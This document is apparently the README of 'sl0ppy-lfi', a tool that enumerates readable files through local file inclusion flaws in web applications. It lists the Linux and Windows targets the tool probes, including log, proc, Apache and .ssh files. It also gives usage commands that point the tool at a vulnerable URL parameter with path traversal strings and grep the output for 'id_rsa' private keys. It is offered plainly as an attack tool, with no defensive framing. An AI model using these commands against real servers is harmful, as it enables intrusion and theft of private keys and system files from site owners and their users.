# sl0ppy-lfi
A small lfi enum tool, i upgraded the original source a bits here and there.  

# Added searches
* linux local files 
* linux log files 
* Linux proc files
* linux apache files
* linux .ssh files
* linux other files 

* windows local files
* windows log files
* windows config files
* windows other stuff    
* and alot more 

# Usage 
* sl0ppy-lfi-fw  
* sl0ppy-lfi 

# Usage sl0ppy-lfi-fw (sl0ppy-lfi-framework)
* ./sl0ppy-lfi-fw 
* Choice 1 for windows based lfi file checks
* choise 2 for linux based lfi file checks
* cboise 3 for linux windows lfi file checks 
* Enter the url with lfi hit  

# Usage sl0ppy-lfi 

# Enum all sl0ppy-lfi
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../` 


# Enum specific stuff like only libc
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "libc"`
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "id_rsa"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "libc"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "id_rsa"`

# Output Enum 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= > output && cat output`  

# sl0ppy-ProcessInfo
`./sl0ppy-ProcessInfo http://server.vulnerable.com/download.php?file=` 
